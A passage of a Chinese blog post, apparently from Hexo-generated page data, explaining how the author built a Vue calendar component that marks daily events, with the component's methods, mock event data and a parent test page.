class=\"keyword\">const</span> rightNow = _this.exactTime</span><br><span class=\"line\">      <span class=\"comment\">// 拼接 显示日历上的年月 '2019-05'</span></span><br><span class=\"line\">      _this.showDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>`</span></span><br><span class=\"line\">      <span class=\"comment\">// 获取当月的第一天</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> firstDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(year, month - <span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">      <span class=\"comment\">// 获取第一天周几</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> firstDay = firstDate.getDay()</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否为闰年</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> isLeapYear = year % <span class=\"number\">100</span> == <span class=\"number\">0</span>? year % <span class=\"number\">400</span> == <span class=\"number\">0</span>? <span class=\"number\">1</span>: <span class=\"number\">0</span>: year % <span class=\"number\">4</span> == <span class=\"number\">0</span> ? <span class=\"number\">1</span>: <span class=\"number\">0</span></span><br><span class=\"line\">      <span class=\"comment\">// 获取今年每个月的天数</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> monthArray = [<span class=\"number\">31</span>, <span class=\"number\">28</span> + isLeapYear, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>]</span><br><span class=\"line\">      <span class=\"comment\">// 计算星期的行数</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> weeekLines =<span class=\"built_in\">Math</span>.ceil((monthArray[month - <span class=\"number\">1</span>] + firstDay)/<span class=\"number\">7</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> calendar = []</span><br><span class=\"line\">      <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; weeekLines; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> weeekLinesInfo = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">7</span>; j++) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 计算每个单元格的序号</span></span><br><span class=\"line\">          <span class=\"keyword\">const</span> cellNo = i * <span class=\"number\">7</span> + j</span><br><span class=\"line\">          <span class=\"comment\">// 计算每个单元格应该填充的日期</span></span><br><span class=\"line\">          <span class=\"keyword\">const</span> datePerLine = cellNo - firstDay + <span class=\"number\">1</span></span><br><span class=\"line\">          <span class=\"comment\">// 排除空白格</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span>(datePerLine &lt;= <span class=\"number\">0</span> || datePerLine &gt; monthArray[month - <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 不存在的显示为 null 和 ''</span></span><br><span class=\"line\">            <span class=\"keyword\">let</span> outOfMonth = &#123;</span><br><span class=\"line\">              <span class=\"string\">\"type\"</span> : <span class=\"string\">'null'</span>,</span><br><span class=\"line\">              <span class=\"string\">\"date\"</span> : <span class=\"string\">''</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            weeekLinesInfo[j] = outOfMonth</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> day = (datePerLine + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">let</span> inOfMonth = &#123;</span><br><span class=\"line\">              <span class=\"string\">\"type\"</span> : <span class=\"string\">''</span>,</span><br><span class=\"line\">              <span class=\"string\">\"date\"</span> : day,</span><br><span class=\"line\">              <span class=\"string\">\"isDone\"</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">              <span class=\"string\">\"infor\"</span>: <span class=\"string\">''</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 今天背景变成一个红圈,这是今天 =&gt; rightNow</span></span><br><span class=\"line\">            <span class=\"keyword\">const</span> propsDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>-<span class=\"subst\">$&#123;day&#125;</span>`</span></span><br><span class=\"line\">            <span class=\"comment\">// 比较每月的今天</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(propsDate == rightNow)&#123;</span><br><span class=\"line\">              inOfMonth.type = <span class=\"string\">\"1\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">const</span> reservations = <span class=\"built_in\">JSON</span>.parse(_this.infoList)</span><br><span class=\"line\">            <span class=\"comment\">// 将 父组件传的 list 赋值在日历上</span></span><br><span class=\"line\">            <span class=\"comment\">// 预定列表 和 当月每一天比较</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> k = <span class=\"number\">0</span>; k &lt; reservations.length; k++) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span>(propsDate == reservations[k].date)&#123;</span><br><span class=\"line\">                <span class=\"comment\">// inOfMonth.type = \"1\"</span></span><br><span class=\"line\">                inOfMonth.infor = reservations[k].info</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(rightNow == reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"1\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"doing\"</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rightNow &gt; reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"pass\"</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rightNow &lt; reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"2\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"will\"</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            weeekLinesInfo[j] = inOfMonth</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        calendar.push(weeekLinesInfo)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">window</span>.console.log(calendar)</span><br><span class=\"line\">      <span class=\"comment\">// 即将遍历二维数组</span></span><br><span class=\"line\">      _this.calendarData = <span class=\"built_in\">JSON</span>.stringify(calendar)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 格式化当前日期 YYYY-MM-DD</span></span><br><span class=\"line\">    getToday() &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> nowDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">      <span class=\"keyword\">let</span> yy = nowDate.getFullYear().toString()</span><br><span class=\"line\">      <span class=\"keyword\">let</span> mm = (nowDate.getMonth() + <span class=\"number\">1</span> + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> dd = (nowDate.getDate() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> hh = nowDate.getHours().toString().padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> mt = (nowDate.getMinutes() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> ss = (nowDate.getSeconds() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> [yy, mm, dd, hh, mt, ss]</span><br><span class=\"line\">      <span class=\"comment\">// return `$&#123;yy&#125;-$&#123;mm&#125;-$&#123;dd&#125;-$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;`</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 组装 picker 数组</span></span><br><span class=\"line\">    getSlotsArray(year, month)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"keyword\">let</span> yearArray = []</span><br><span class=\"line\">      <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">-10</span> ; i &lt;= <span class=\"number\">10</span> ; i ++)&#123;</span><br><span class=\"line\">        yearArray.push(year - <span class=\"number\">1</span> + i)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> monthArray = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">      <span class=\"keyword\">let</span> slots = [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          values:yearArray,</span><br><span class=\"line\">          className:<span class=\"string\">\"slot1\"</span>,</span><br><span class=\"line\">          defaultIndex: <span class=\"number\">11</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          values:monthArray,</span><br><span class=\"line\">          className:<span class=\"string\">\"slot2\"</span>,</span><br><span class=\"line\">          defaultIndex:month - <span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">      _this.slots = slots</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 显示日期弹窗</span></span><br><span class=\"line\">    clickData()&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.popupVisible = <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 取消按钮</span></span><br><span class=\"line\">    cancelFunc()&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.popupVisible = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 确认按钮</span></span><br><span class=\"line\">    sureFunc() &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      _this.popupVisible = <span class=\"literal\">false</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> clickData = _this.$refs.picker.getValues()</span><br><span class=\"line\">      <span class=\"keyword\">const</span> year = clickData[<span class=\"number\">0</span>] + <span class=\"string\">''</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> month = (clickData[<span class=\"number\">1</span>] + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">const</span> day = _this.time[<span class=\"number\">2</span>]</span><br><span class=\"line\">      _this.getDateInfo(year, month)</span><br><span class=\"line\">      _this.getCalendar(year, month)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 调用父组件定义的方法</span></span><br><span class=\"line\">    getDateInfo(year, month) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.$emit(<span class=\"string\">'getDateInfo'</span>, year, month)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 点击展示某天的事项信息</span></span><br><span class=\"line\">    showInfo(info) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> infor = info</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(infor.infor) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> [year, month] = _this.showDate.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(year, month, info)</span><br><span class=\"line\">        <span class=\"keyword\">const</span> titleDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>-<span class=\"subst\">$&#123;info.date&#125;</span>`</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> preview = info.infor</span><br><span class=\"line\">        MessageBox(&#123;</span><br><span class=\"line\">          title: titleDate,</span><br><span class=\"line\">          message: preview,</span><br><span class=\"line\">          showCancelButton: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          closeOnClickModal: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其他：为了减少篇幅，省略样式</p>\n<p><a href=\"https://github.com/houfee\" target=\"_blank\" rel=\"noopener\">github地址</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"日历组件\"><a href=\"#日历组件\" class=\"headerlink\" title=\"日历组件\"></a>日历组件</h1><h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><blockquote>\n<p>忙活了大概三天，做出来非常开心，心里美滋滋的</p>\n<p>其实很早就想自己写一个日历组件了，只怪自己懒散</p>\n<p>现在写一下思路过程，记录一下</p>\n</blockquote>\n<p>  <img src=\"/view/posts/3b43e344/calendar.gif\" alt=\"calendar\"></p>\n<h2 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h2><p>1、实现一个日历组件，如图：</p>\n<p><img src=\"/view/posts/3b43e344/20190606223710.png\" alt=\"20190606223710\"></p>\n<p>2、显示某天的事项：</p>\n<p><img src=\"/view/posts/3b43e344/1559832421561.png\" alt=\"1559832421561\"></p>\n<p>3、事项是模拟父组件请求接口返回的，数据格式如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'232'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-01'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'292'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-06'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'292'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-07'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          id: <span class=\"string\">'369'</span>,</span><br><span class=\"line\">          date: <span class=\"string\">'2019-06-30'</span>,</span><br><span class=\"line\">          info: <span class=\"string\">'我要去吃大餐'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br></pre></td></tr></table></figure>\n<p>4、把事项添加到日历组件中，数据格式如下：</p>\n<p><img src=\"/view/posts/3b43e344/2019-06-06_22-54-19.png\" alt=\"2019-06-06_22-54-19\"></p>\n<h2 id=\"代码解析\"><a href=\"#代码解析\" class=\"headerlink\" title=\"代码解析\"></a>代码解析</h2><p><strong>package.json文件：</strong></p>\n<p>父组件页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"test-container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Test页面，测试组件<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 日历 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">calendar</span> <span class=\"attr\">v-if</span>=<span class=\"string\">\"calendarVisible\"</span> @<span class=\"attr\">getDateInfo</span>=<span class=\"string\">\"getDateInfo\"</span> <span class=\"attr\">:propsInfoList</span>=<span class=\"string\">\"propsInfoList\"</span> <span class=\"attr\">:propsTime</span>=<span class=\"string\">\"propsTime\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">calendar</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">import</span> calendar <span class=\"keyword\">from</span> <span class=\"string\">'@/components/Calendar/Calendar.vue'</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  name: <span class=\"string\">'test'</span>,</span></span><br><span class=\"line\"><span class=\"undefined\">  components: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"string\">\"calendar\"</span>: calendar</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      calendarVisible: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">      propsTime: <span class=\"string\">''</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">      propsInfoList: <span class=\"string\">''</span>,</span></span><br><span class=\"line\"><span class=\"undefined\">      middle: [</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-01'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'292'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-06'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'292'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-07'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'369'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-30'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      ]</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  created() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 模拟首屏ajax请求，将当月数据传入组件中</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">this</span>.propsInfoList = <span class=\"built_in\">JSON</span>.stringify(<span class=\"keyword\">this</span>.middle)</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">this</span>.propsTime = <span class=\"keyword\">this</span>.getToday()</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  mounted() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.alert(<span class=\"string\">'测试时间为19年 5、6、7月，完成是在6月'</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  methods: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 格式化当前日期 YYYY-MM-DD</span></span></span><br><span class=\"line\"><span class=\"undefined\">    getToday() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> nowDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> yy = nowDate.getFullYear().toString()</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> mm = (nowDate.getMonth() + <span class=\"number\">1</span> + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> dd = (nowDate.getDate() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let hh = nowDate.getHours().toString().padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let mt = (nowDate.getMinutes() + '').padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let ss = (nowDate.getSeconds() + '').padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;yy&#125;</span>-<span class=\"subst\">$&#123;mm&#125;</span>-<span class=\"subst\">$&#123;dd&#125;</span>`</span> <span class=\"comment\">// -$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 组件传值</span></span></span><br><span class=\"line\"><span class=\"undefined\">    getDateInfo(year, month) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span></span><br><span class=\"line\"><span class=\"javascript\">      _this.propsTime = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>`</span></span></span><br><span class=\"line\"><span class=\"javascript\">      _this.calendarVisible = <span class=\"literal\">false</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月</span></span></span><br><span class=\"line\"><span class=\"javascript\">      setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        _this.propsInfoList = []</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> middle</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span>(month == <span class=\"string\">'05'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle  = [</span></span><br><span class=\"line\"><span class=\"undefined\">            &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">              id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              date: <span class=\"string\">'2019-05-10'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              info: <span class=\"string\">'我要去吃小餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">            &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">          ]</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (month == <span class=\"string\">'06'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle = _this.middle</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (month == <span class=\"string\">'07'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle  = [</span></span><br><span class=\"line\"><span class=\"undefined\">            &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">              id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              date: <span class=\"string\">'2019-07-10'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              info: <span class=\"string\">'我要去吃小餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">            &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">          ]</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          middle = <span class=\"string\">''</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        _this.propsInfoList = <span class=\"built_in\">JSON</span>.stringify(middle)</span></span><br><span class=\"line\"><span class=\"javascript\">        _this.calendarVisible = <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;, 100)</span></span><br><span class=\"line\"><span class=\"undefined\">    